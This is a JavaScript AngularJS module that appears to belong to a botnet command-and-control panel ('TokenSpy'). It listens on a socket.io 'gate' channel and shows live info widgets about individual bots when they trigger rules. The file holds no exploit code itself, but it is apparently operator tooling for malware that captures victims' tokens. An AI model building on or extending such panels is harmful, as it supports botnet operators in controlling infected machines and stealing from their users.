'use strict';

require(['page-botnet_tokenspy-ts-infowin'], function(App){
    var app = App.init(window.data.tokenspy.infowin);
    App.load(document.getElementById('ts-infowin'));
});

define('page-botnet_tokenspy-ts-infowin', ['angular', 'underscore', 'jquery', 'socket.io', 'angular-extensions'], function(angular, _, $, io){
    var init = function(appData){
        var app = angular.module('TokenSpy.infowin', ['Extensions']);



        // Services
        /** NodeJS connection service
         */
        app.service('nodejs', ['$window', function($window){
            this.ok = false;
            var sio = this.socket = io_connect('/TokenSpy');
            this.ok = true;

            sio.on('connect', function(){
                // Subscribe the socket to the rooms i'd like to have
                sio.emit('subscribe', {room: 'gate'});
            });

            /** Subscribe to an event
             * @param {String} name
             *      Event name to subscribe to
             * @param {function(msg)} callback
             *      Event receiver
             */
            this.on = function(name, callback){
                sio.on(name, callback);
            };
        }]);



        // Controllers
        app.controller('TsInfowinCtrl', ['$scope', '$element', '$http', 'nodejs', function($scope, $element, $http, nodejs){
            $scope.feed = []; // InfoWidgets feed

            // Utility
            setInterval(function(){
                // Remove widgets older than 60 mins
                var now = new Date();
                $scope.feed = _.filter($scope.feed, function(item){
                    return (now - item.ctime) <= (60*60*1000);
                });
                $scope.$apply();
            }, 60*1000);

            // Helper methods

            /** Add a feed item, irrelevant to its contents
             * @param {String} type
             * @param {Object} data
             */
            var addFeedItem = function(type, data){
                // Create an item
                var item = {
                    type: type,
                    data: data,
                    ctime: new Date()
                };

                // Add an item
                $scope.feed.push(item);
                $scope.$apply();

                // Finish
                return item;
            };

            // Events
            var on_bot;
            nodejs.on('rule', on_bot=function(msg){
                // Add 'bot' InfoWidget
                $.post('?m=botnet_tokenspy/ajaxTsInfowindow_Bot', {botId: msg.botId}, function(data){
                    addFeedItem('bot', data);
                });
            });

            $(window).on('bot', function(e, botId){
                // $(window).trigger('bot', 'BOTID_STRING');
                on_bot({botId: botId});
            });
        }]);

        // Finish
        return app;
    };

    return {
        init: init,
        load: function(ngApp){ angular.bootstrap(ngApp, ['TokenSpy.infowin']); }
    };
});
